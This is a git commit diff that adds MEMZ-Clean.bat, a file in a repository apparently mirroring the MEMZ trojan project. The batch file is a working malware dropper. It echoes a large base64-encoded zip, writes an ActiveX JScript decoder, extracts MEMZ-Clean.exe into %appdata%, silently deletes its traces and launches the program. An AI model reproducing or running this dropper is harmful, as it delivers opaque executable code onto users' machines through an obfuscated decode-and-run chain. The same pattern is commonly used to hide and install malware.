dbdebfef350cdfba34e62b529ec2db294c8a816c
Christopher Lentocha <christopherericlentocha@gmail.com>
2026-01-16 04:55:17 -0500

    Leurak/MEMZ-g9f09ca4
    http://github.com/CE1CECL/MEMZ/tree/9f09ca4ae78b1e024c35a912a3dcebd8705d259d

---
+++ MEMZ/MEMZ-Clean.bat
@@ -0,0 +1,136 @@
+@echo off
+
+echo UEsDBBQAAAAIAF0bW1qcYjHfAhoAAABEAAAOAAAATUVNWi1DbGVhbi5leGXtWw9UVNeZvwOYUIOR>x
+echo ZDGHNmhfUrI1HcGZBwoq4uAwBhJQBFFrNeYx8wZG3sybzLzhj9UNiqRORnJoj+2aHpujGzf9s9mT>>x
+echo 5DSbaNIa1FZMa3vcxEYwbkL3uOlY3a1NrbFpNrO/7773YEAE9nR7umfXpx/33u/d7/93v3vfe1C9>>x
+echo roelMsbSAIkEYweZfjnYxFcH4PbPvno7e+lTP7vnoKXqZ/esavKFhWBIbQxJfsEtBQKqJjTIQigS>>x
+echo EHwBoXxFneBXPXL+tGlTcw0eNS7Gqiy3srfu6W00+Q6y21Nvs6T8NbsLgy8AUhhrzkKbCbAZ2mXq>>x
+echo eNLbYujPr336wP23dNuBW4I+l35k6lMyRxkxO30cI3vALmUSzhh1vbSNsSzLje/na3KbhnbQtOuu>>x
+echo ZCP0S2DskXyPpEno7yMdbMacz4yc52CsNz+kT8zI1BHsTsCs6+Y58uWmjV5Ep5f4PAK4xeA7el5D>>x
+echo OMwM1VhwbBs6SK5Pl8t9CASbCpg/ln6yoroNX/YYdjium7d0bEk3rz/XVR/9t9V1nZeEvrRcCnVs>>x
+echo Zs12B0u8VRs9DszdwCTeWuntOj49+hr6HYsFm4Ox6bunUBubtwVztfrEjCq03fXx6KrctGhabmKG>>x
+echo B+Oamr7y3IwuUKHlCwwtT3AwpibxduelzCRcehYEzyjnpBfvI+IpYxDvTw86GAnh1LrS16vbXoSh>>x
+echo h4YzMsBw9cVfjJp6hz71HurX8X4dyNr+CsOpw2QX3v8kkTCM1s6/5kBrv7pg3jmng7X8gjRkozS8>>x
+echo TC50ZnIn7AIH6FgR+XzMmZ3qzIk6c2J1QveDluhDAtFQcYiCJpqVm6hLizqzl3Uey724HwFZs7pu>>x
+echo 26VdxGpDesyVEavPjEWyOq/dEpnV9WZket8UBhfQdWERFlN0Jg0v2NDtvJYSmWZ6d8albQ62+A5I>>x
+echo md41AETXm9O7bkvhao6pdrQwSefpXYMgfJ0M7nPtpmkx1+4FU8jw6Y//GLcWtWZGvtzxWAaLRMZi>>x
+echo +FudYWwaMYxW9yT+WY91RqEx8V6Hg0/8PNpoDiRrumRYGavuiQjJTC0jmXJeCdfuzr7cC95EItF5>>x
+echo bfr0rmxM6nZ9h/uT2OVS+FZHj+9Po3QhLJnXD5esWXOQQagR1ciUg5mkgutAt+sA5mVDUBbVpm7X>>x
+echo PgwzxzLuYJmD5/B95OXL20jvnBimU9AzIbc22neIttT95C77mx/+lncsp6jbXWNpfnNqc+8sy9Ho>>x
+echo ltzMGJeS0b3042j9bvTSif9Uw3mLB8E7cabzUhawmWW69IzSpVh59bs7j2ZguSXP5zOTfVACXVau>>x
+echo vPjpaCQrWp8ZdWVEN6R3y1e+9PDGDYn7bLhp7zWGRzOpDqAM5CLjul1Xhlg0kTm1Xb1aUWLGFWiz>>x
+echo yHUlMmfBTFqDWu5YvqE1ximNTDpo4Wn88RtH05mZ2RkWclwv2A2nsrkkZ5wGemV3/S7TuPXEkDx7>>x
+echo ijs6QzewcPrLrm+jtaF9Fu0ctH+PdjZaCmMu2mfQCmj/Dm0O2v0UXrTk8ayYay+FN+baQ/5HcpPz>>x
+echo Y64esjzm2sUlnuQSi5+hFOrrWo9Uo32yr8uD3lfvoJWx4+hSuvUIEKn8VlOCzlDUU4Z6waGeNtRr>>x
+echo G+ptQY+c1ufq4AjXTmq6uTiuRQccWdfXZRuiKEavgxZyV6GBmzjbustThGhXCeaPrKc/gSSbKUng>>x
+echo IcsYKiAfw/7VmDeH6ZVqNvq5Bq3AawLnaOV6kJNjXDerztFYS6I+P9NoM0gm6fD2Ur0AcA+aEudw>>x
+echo DWzPUH4d5tX2HV7vF8zklWfHLRZd8Y9MlR/h+Rk98jp5INr/1IeJ7jZLc4IvsGvdm6nre/ME7lk+>>x
+echo 6vyj5dOJbb+iU+G2vtQaS82QZVXDlsWm8e2lKpcKUM4sXefsE7r9WcjJTKzajNiydHOt5jivVz+6>>x
+echo jJcNnvkzeP0xctlm5rKxOHitMfzDNdHA+xaTtbEsdNZxnovZzs7juRcufMLDODkBabSJDm2aM/bw>>x
+echo ujg8PoDxmtF6jFjYmY7rNm5Tm7EKAM/ebzkoQFQGVumKdPX+TeF+WutdvZG7+I29VJx4r5AS/OL3>>x
+echo o+uNw4Ni1pwzF5826tOxnh69eHRe2kIVauvLhxmy4xCdcX934Ebqd7teNn0JdRLdrhc4/xe2m8qn>>x
+echo XZubNWxUOndNFIXBdaLPdZLfc53SF+VpvenXm3N6M6g3500X0Jro3noCGYISoss6qC8p89y0Y53l>>x
+echo xhvw6HPD9K45mG2/2ufaxxf5HVYE9/JTH/4Bh4BZ8UJU/UP7pjMGRPcTceT/wfLn+CiKCodpW/e9>>x
+echo g079nrNb9/RPm4M0Hdj6rDfmerbjZIYX292A/8B7G/YM+J9FCYzV792ZJi7b9gnZHPmGqfwPKESm>>x
+echo YclW9epW7SOjrrr6Ldpt5hnplotVO3ojt5sTX8LEiy2TPigdQiwszDx91V58etKUT154ihZF8uGt>>x
+echo 5sLjQA3lTUnH1kychLbxvBjk1BU0K7bhfDwO5tHj8V9Sc+T1Pel02slALensTYm6Tuu15TLVllAi>>x
+echo egKePT39+Q8s78bAxnUq/g9EdSx+gBNjBafpZWjd0NSzMdep7qxUOubN6OG5fZCegYZTe7SOn+hL>>x
+echo 7TYydOba7XQcX3mYSJ768BNIxC1yCk6sND6WbA1V6zTLY0MrNbY4SORnUCL5Lnf+/n59nxu0uk7p>>x
+echo W102iGPzimkanajj525lbGCKDflydmv6QPzckYE3+hcXYvjukYGtb3tj9W93/BwJVH96wH/6nQ0n>>x
+echo B/xvx6pP6klZSdJTh6VzuX3xJ8AxVp17/wDl5lvxL9/KkykD6z09Vi1Yq08RfpWpC9dilIPgH+zD>>x
+echo 5JxIRXzRrTwPsqaOseIP5XMv/SGW9vVBOz/38dVfnFyks/XlH//dLWSowzT03SP9i8sx6J9SgZ+H>>x
+echo TuiMovWXz7ouD2y9ipVzVV85Vwb8V97ZcHnAfzXmuvzGMV036M7VW0ZbYzorII1yDM2yeWmnM0d9>>x
+echo Lu0gsXoBTcboosmDeIIX1tyD9Ohi8uaMF6Lq0NKIl0DtQ1/Qtes8akMkBolTDs/rcxTToUW0Q1+m>>x
+echo 8U8RSY9FLxXbqai8caxHP+9lJWZc28YdNUKftZ/jDpvC2ezWF1n0GHnZlqmvxiqnvi2sSnZtmzGT>>x
+echo qvo+Wlz2Xn70S2NJlhSPt9tcm2nsNpnX7zbxsikUsV0UsWojYj08YrspYrMmG7Hh9TYntlXfaR1c>>x
+echo moNLY3yJcmuzDbWyPIa6KXokdV8Juq+mEa4Ea2insYZysHWVwAfxaVOG438dl/UjPZ6hc+H03H9p>>x
+echo 5D9+ejbP6Om6F/VEu1d/6E5mcWWWsac79LgfFHkSJdWXKr2+fI3y6AqqWmyr0P1KEFWSCkn9YHww>>x
+echo la/U7qd03B+j9efiJ1P1unMmfpT3gOyPv5LKa94LqfpZUGAn8UjSj6zOwcrOjkWyUQezzJTjp6Z+>>x
+echo vYMadM6oQEMPZUbOD0zZk7wW9/LI7uP71vuI5ft6LM8P+M+/s2FwwP8+WJgVwshl7pjFI46viGN8>>x
+echo aurwBkKHDH5aptMxqkSWzfDZc8Za+RcE59BUI5VOUfaa9aciVp0dcwlYxFzOcrCcTYbDqlx60rhu>>x
+echo xVflZnX+2kPWd8Y9ZtYYx+A0aqMZEHyOWz9nYMqpZOtPc+v7ufXj1h6yGycic/+VJ71jLoo5s/B4>>x
+echo EK3LWuTM3jI7VpcTcwrdFebLCW6B8TqHv5zoc/JFm3DmXJzR59QtdQp6o2f4yM13E05cQ3kHDfV8>>x
+echo xXbK1VhPiwx7WberX9+GTg+9N1q5MhYZtEb6Y1vPW7eeGzo5bR9VKcY1bi0ZR7Zw41xDliE7c5Ca>>x
+echo 2d3V/RSeWP0pvSCfTi7IcMWfZHklLE+qMZ1b01Mj62KuzFg29Jj+6uBdobSu3vaKeIhcfHxop+Yb>>x
+echo /ZlaqzMLx4jLvJKdjy835/CKfmalFZbqd7GZR5050TrkZKa+uWfoCyvd2AP0RTBbd4lZQzKMSty5>>x
+echo OIMevCNlVI/QuWw+T4zeleiwEaT3ci/xPM3C+X3a0AZDb5j0twW8jBLB/gzzyeKg/rwec125Dw55>>x
+echo LLnu5iAfeJHjb0s6r1n+xtFdk4iesr/hjRU+5I2VOL3Rkoe80UJnWcWCI1t+be/1dpY4p0ZmeDu3>>x
+echo OFOmRaZ5+9Kc05i3r9yZMpU5Fhx97L2hw0LCeCY225vX+JcF/+jBgcDC9A8hB1B3ngccphcJE9D/>>x
+echo 4B4HO5DjYIOYO96cwc84WE75jfnRnL3Y/R8sH5/PjwQHaxmHz/p7HcwBPk9PIMuL3fLVCfjsuNvB>>x
+echo 3p6Az3OfdbBr4+hMfHIx707X+LLOg0/+OHO+k63LWD7OnLGuNsx/HvBLwPRlDlYNeAJwEPAbwN0P>>x
+echo ONh6wLcAxwC/B+RUONhGwMuA3wMKKx3sUcAbgMuAex90sLWAnYATgA8B9z/kYD7APsCvALEqB4sD>>x
+echo 0qodbBZABBQBlgCcgErASsA6QAOgGRAGPAb4SvWN/Xnz+p+9XGw5K2NLWRV65RiXs0pWNwJT7ape>>x
+echo x/QPu1K7okoeAV23Ggj7PHJI9ghh2e/La5JCfm9EyZ82lc/0y1IgPEfwaUK4SY0oHvoIHJa8sqCp>>x
+echo QiQszxEaIhp9HxbCmk9R0ANSoA+JgqKGw4IaElStSQ4JWpMv0BgW2tWI4Pc1NmkCfVBulQIaBE2b>>x
+echo Wunld5qkFpk+Onsibs3XYvBRA3QvJITbw5rsJ45hX2MA6voCpIQaUHwBWZDcbjUS0HRVoXdIdqt+>>x
+echo vxzwYCJm0XdrbYTl3GpBElp8IS0iKYJfcjcRI3BVQx7SWIUqcosc0ISgqqHxYdYIy9xNUqCR+I9r>>x
+echo W7nK7+j+ISxxlgNSgwJh2hJWwyTWzhSmovWwMJ5GJBZiMlo3i6BH/QDTMKMduPuYneWjreH4MJ9f>>x
+echo xyoQ62VsFbMi0nXMCZwGfvrPRvxTOD8JrYI2OEriPciNZH5OcKpF1lhHcK4b4hpmzcwHLtRTmZ/z>>x
+echo 1oDRe7PRSpghc17DM0ZLFZgXvTAoZci+n/IT2lezddwjAWCVJBxpRVbQHYGt5jRhyFT5OI97JJm/>>x
+echo MILLUlYPG1axFWy5sVpOLGXsIydjQpkalAM6LljGOl4rp3vEhejquF261yJcXgDeJGub0A/zGJF9>>x
+echo QdzV7VhiLsdS8AevfWUAB2MVkOVw1PEcrpACHqZ3V0ZkJIYaMIauNrci+SWOGabrcNAbpBWQInNr>>x
+echo Q9wyD5cssFZgG7huGvf5XMwL8bjTPD+jj/+1Iyj0vKLIhDDyo20Bpd/Is9GzKZLtkKDyvCTPkhd0>>x
+echo i0fPlXm+6nyJf4TfIw0q0Wvh9zWesW6ebySRYqxnngSdKVNIVhvHURUjK1pH8fZxvwcM22SDc9jI>>x
+echo RBnUpNsqLl/PAaL34p8MSo1HdlgDga8Q8p8bcdXlOrnczXzNLeWxp8x2cR8I3GqKBmVtk6YFF86d>>x
+echo 26iqjYqc71bz3c1zw7IUcjcteXRxA8JrbZXarZpqbUYBsFIpC8uKd3yyJrXVKlpDsl9tka2SFTUq>>x
+echo Eh6fwu9GUZatLWFrQA1pSJ8J+UOjMOqjyZ7G/narN+QDcgJZqJPukOTVrE1Sm9WjtgaopELwZBQ1>>x
+echo RDfKmtWvBuT2CfynBjb7rA0Rj6d9WJA3JMuT8V9DpN3aKssTWGMo5FY9Q662+gLohLEtWBuksM89>>x
+echo PoPWJok8EUQdAaWXQmz1yIqsyVZ9zyoQx2fQWKBZQwXN2gSukDR3k6Gf6YrxKfjcfLltAmf5Apoc>>x
+echo CiAecltQUUNyyOpDNjTJVp68DSG1NSyHxmfhldxyg6o2ww3uZmyGcKiq8Dhdnx7WVjXE54g2+/xJ>>x
+echo GIAw+hRsyFZFbvRpI5lOLrIhWUIsaOVZQWcN4USj+lul0CSSCOTGKvTL/s1WLaRukgKTWo/tyCh/>>x
+echo MKLp7vSoZHGr7At5rPpxwdqqeemOnjhIuKCyGQMlOD5fjxRo5rpMSvch50+CQlK8VsXnla0FMFmR>>x
+echo pTDcDL9NkDvIeEWJoCJg0wKdpEzgFjWgSY2yNSjhlNdu9Us8E4zfM5xERlBa8kggepMQF9bgLlQO>>x
+echo /tMvteP/BHHbpDYFrG4cz6x+n8dn5BzOc4hmoEUOaRNVkxbUxrAUcXM1ZVApiuzm+/n4ijaH4Ee5>>x
+echo zRp2Y7PAkZzyBpkW8IFTOBjyaXKYa2SyQQ63yqFwvt/nDqlh1auBo3+uHMiLhOfCnRqEzvWqoYjf>>x
+echo HG3k5/A8cxSm3+mE7+eSN/P8kkLrged1np7keZS+VMSU9jwPCkFIbafp4vziBrfdLeYVLPAW5hWK>>x
+echo 3uK8BTYM5y0okuYXFTTMbyicZ+ro5yIbVCnkyW+BIVxFBM0zt5VqWR4dyE3ReVokFMiT8sxFk4eq>>x
+echo pGLs8SEAkpLXJCsKdA4O5WNQkdrz3UqkAaunMeILEPOhe241qPn8vs1yCPYm3yFPqXAqx7klxc0Q>>x
+echo WzmISuL2e1gr+ZmFZBzqfThGGOWQaVK42d8YYv4wksDra0QnKEE/5pFb/I1+LR83GG7BRwrz+92M>>x
+echo PeB0LhRmP7C8/n7Bbstr9QUKREG0iaKtQKTfm7p5/+b9P+v9m9f/vyvLaC2ba5llS7rl7oy0tJ0W>>x
+echo xug7B8Hg84nEV+mFY9nt6V0pS6dNcT2e2pnGWDFQJYCVLyYSrSlJ9yu/kvp4WueU1NUpU4+VHS/r>>x
+echo K/sxOC67bdnwgL6c4lmLsV3fTyTcLIm2vDM15Ys/PkZz6Fez9gJ+ijmL0sbgb01L4jixHb2vJBJF>>x
+echo yXou0/nciG62SXcokdjPrqdL2T0s/kY85hg8hFcTiVmW63mk3mH5b9lwDXz2JuuSsodTTkS3/rVE>>x
+echo Yv0IurWTousA3ZdG0K0Zl04w6A6ALjA6rh49rnTfAfgPzNk1gvfOcXmb8Sj/QSJxcKx4fHfYlTSv>>x
+echo AnAKc+clz31Ud/REMohucCwZb00cc9MHyg8TiYdH+2C17oOJ/N4D2j0jfLN7XN9kG3SXQbdvlEzC>>x
+echo 01rVDicSH41h00S+KH59lC6mL6IT+8K0Zxd4bB5hT8ukYn3q9VH1wZS9esSyuXn9Cde+juF+/+P6>>x
+echo 3y09l4S7BFwvcC8l4bK/wtgJ4E4n4WqAiwOXtm0Y5wEueztjGUm4a8AJwO1JwuXshMztY+t3AvhB>>x
+echo 494HRpveydidAAGQD3AAagAPd+r3N6HdDNgJ+CbgBcBxwFlAHHAVkLYDeu0w7DHa2WhLAA8C1gMC>>x
+echo gA7AbsA+wHOAXsDPAe8CPiC6LsZuB9wLsAGWAmoBAcB2wJOAvYDvAV4F/BxwFnCZ/jIGvs0E5AJE>>x
+echo wDLA+sd1XRS0mwE7AXsAL1AcHr/pkxv55JtpzlB7UCtzPxrxhWQnHqvkNm0NZOj4B+RArRTw4PGN>>x
+echo bWSVAZ/mVP1+NeDUH7/CtCcs9WlLFY3eHTv5q59luLeGeVMekLUVDZvw9AturTSq01R3s45ibGZq>>x
+echo nUzP6ub4i6l1WkjGcyrntTF1FdRYESHaDw2+q5roYZYxt8XV5tNqQqpbDofZP1qWqSG/pFVjIDXK>>x
+echo mC+QLGckFJID5qxKD8tNwuqcgGQdhK1WPRFFps8ECtEXpT6gqA2SUqbQH96VGqNl9BaUnU2tUt3m>>x
+echo LbZpSp0iy0Em3qLgiV2RA6Cea6mjh2dXm+zGg3UZS2Nlnk2RsLbGBy+21nJb72RL5UZfoIY/1bJ7>>x
+echo mFNSlOWwt0JVm1044LUbFus0rrY17HusXPbqQzIJco6wch+ei+GwYcsHWHlIaq100+eMj5gr4DEk>>x
+echo /Cf6Eb+zyad4dB6IW6aFcObQZdG9E1ZDNSruVtK4XA43a2pQn4MsItxDcnudRu+pumk0JPqnNNI/>>x
+echo qlTLWsjnBo/zhNOJy53s4vCoSg00QtsPhjHcLR8Nj/UADQePFaZUhst9kqI2Dlu7MaVKRRRh7Rr2>>x
+echo RIqBX6q2lbGvJo3WsH9NqZU98Itpx/sYN/rolY9TkcJhci/7DLIx4KkMBCMa+yzvGxxW+fyySmko>>x
+echo JGNBYcc42WPdNDbcqcdxDftWal2TOiT3h6mr6F2oAu8ZbBg7mlofaMLsEYTsTGp90DMUf8Y+xWoU>>x
+echo qb1OjQQ8ZYz9E2uVWmSsjRX0Ke1lc1RD34IZe2VoHJKDUkiugCPlEP19soGvlcMycuKwOV7D38Lo>>x
+echo f4MKKCtfXVZTWSDmexT6JMeygHOuqHauqgKuvKqK17aOG8MD5cPEJR2Th4dctctdVcNya4Crq3BV>>x
+echo mSgPxv8boL7OVWtq2dYxNqypXF5dbTrr5vV/88rU/079DttcW5Ftsc1lq7c9YeuxvWj7pS3bnmuf>>x
+echo Yy+0r7O/ZD9mP2u/XZwp5okbxVbxMXGneEYcFP9dvCJ+JKYUFBQ4ClYUrC+QC/YWvFjwTsG1glmF>>x
+echo XyicV7i2sL3wscKewu8W3j3vc/OK5pXO2z/vJ/Pemnfb/Lvnt83vmN89/+vzvzl///xvzz88P7No>>x
+echo SVFV0SNFkaJvFx0pervo/aLfFF0tShQJxfOKNxY3F7cVby/+WvHB4g+Kpy54eEHjgq8teH/B3QsL>>x
+echo F5YsrFi4YWHnwm8s/OHCXyz848LAon2L3lj03qJbSu4qua+kv+R8yW9LEiUZi+9c/OTidxZbSmeU>>x
+echo 3ltaVLqktKp0bemTpc+Uvlh6uPRHpXcseXDJniWvLvnJkreW0EMc/ebLdlvMtsf2tO2s7RPbrfYO>>x
+echo e9T+Dfte+wn7b+y14iaxRewW94snxaqCaMF7sPjewtmFJYU1hV8s3Epv02w4G6HJsmXbcmwOW7mt>>x
+echo wuaxNdkU207bLvj3OdsLtpdsp2ynbf22K7Zrto/h7Ry7YC+xO+zl9kfsHnuTfYd9p32X/Tv2F+yD>>x
+echo 9vP2uP2S/bL9iv2a/WM7E9PEdDFDzBSzxGwxRxTEXHG2OEe0iYVisVgiOsRysUKsEmvEVeJacb34>>x
+echo iOgRm0RFDIqa2CZuETvEHYjgLrFH3C3+ZdPv5vWXvf4LUEsBAhQDFAAAAAgAXRtbWpxiMd8CGgAA>>x
+echo AEQAAA4AAAAAAAAAAAAAAO2BAAAAAE1FTVotQ2xlYW4uZXhlUEsFBgAAAAABAAEAPAAAAC4aAAAA>>x
+echo AA==>>x
+
+echo f=new ActiveXObject(^"Scripting.FileSystemObject^");i=f.getFile(^"x^").openAsTextStream();>x.js
+echo x=new ActiveXObject(^"MSXml2.DOMDocument^").createElement(^"Base64Data^");x.dataType=^"bin.base64^";>>x.js
+echo x.text=i.readAll();o=new ActiveXObject(^"ADODB.Stream^");o.type=1;o.open();o.write(x.nodeTypedValue);>>x.js
+echo z=f.getAbsolutePathName(^"z.zip^");o.saveToFile(z);s=new ActiveXObject(^"Shell.Application^");>>x.js
+echo s.namespace(26).copyHere(s.namespace(z).items());o.close();i.close();>>x.js
+
+set v="%appdata%\MEMZ-Clean.exe"
+del %v% >NUL 2>NUL
+cscript x.js >NUL 2>NUL
+del x.js >NUL 2>NUL
+del z.zip >NUL 2>NUL
+del x >NUL 2>NUL
+start "" %v%
